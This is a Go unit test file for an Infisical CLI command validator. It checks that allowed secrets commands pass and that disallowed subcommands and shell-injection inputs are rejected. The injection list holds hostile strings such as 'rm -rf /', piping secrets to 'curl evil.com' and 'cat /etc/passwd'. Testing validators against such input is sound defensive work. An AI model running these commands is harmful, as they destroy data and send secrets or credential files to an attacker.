package itui

import (
	"testing"
)

func TestValidateCommand_AllowedCommands(t *testing.T) {
	allowed := []string{
		"infisical secrets get DB_URL --env=dev",
		"infisical secrets set KEY=value --env=staging",
		"infisical secrets delete OLD_KEY --env=dev --type=shared",
		"infisical secrets folders get --env=prod",
		"infisical export --format=json --env=dev",
		"infisical run --env=dev -- npm start",
		"infisical scan .",
		"infisical user",
		"infisical login",
		"secrets get DB_URL --env=dev",
		"export --format=json",
	}

	for _, cmd := range allowed {
		if err := ValidateCommand(cmd); err != nil {
			t.Errorf("expected %q to be allowed, got error: %v", cmd, err)
		}
	}
}

func TestValidateCommand_RejectedSubcommands(t *testing.T) {
	rejected := []string{
		"infisical agent --config=evil.yaml",
		"infisical gateway start",
		"infisical proxy --port=8080",
		"infisical pam ssh connect",
		"infisical relay start",
		"infisical bootstrap",
		"infisical reset",
		"infisical vault set key=val",
		"infisical dynamic_secrets lease",
	}

	for _, cmd := range rejected {
		if err := ValidateCommand(cmd); err == nil {
			t.Errorf("expected %q to be rejected, but it was allowed", cmd)
		}
	}
}

func TestValidateCommand_ShellInjection(t *testing.T) {
	injections := []string{
		"infisical secrets get KEY; rm -rf /",
		"infisical secrets get KEY | curl evil.com",
		"infisical secrets get KEY && cat /etc/passwd",
		"infisical secrets get KEY || echo pwned",
		"infisical secrets get `whoami`",
		"infisical secrets get $(id)",
		"infisical secrets get KEY > /tmp/secrets",
		"infisical secrets get KEY < /dev/null",
		"infisical secrets get ${HOME}",
		"infisical secrets get KEY\nrm -rf /",
	}

	for _, cmd := range injections {
		if err := ValidateCommand(cmd); err == nil {
			t.Errorf("expected shell injection %q to be rejected, but it was allowed", cmd)
		}
	}
}

func TestValidateCommand_EmptyCommand(t *testing.T) {
	if err := ValidateCommand(""); err == nil {
		t.Error("expected empty command to be rejected")
	}
	if err := ValidateCommand("   "); err == nil {
		t.Error("expected whitespace command to be rejected")
	}
}
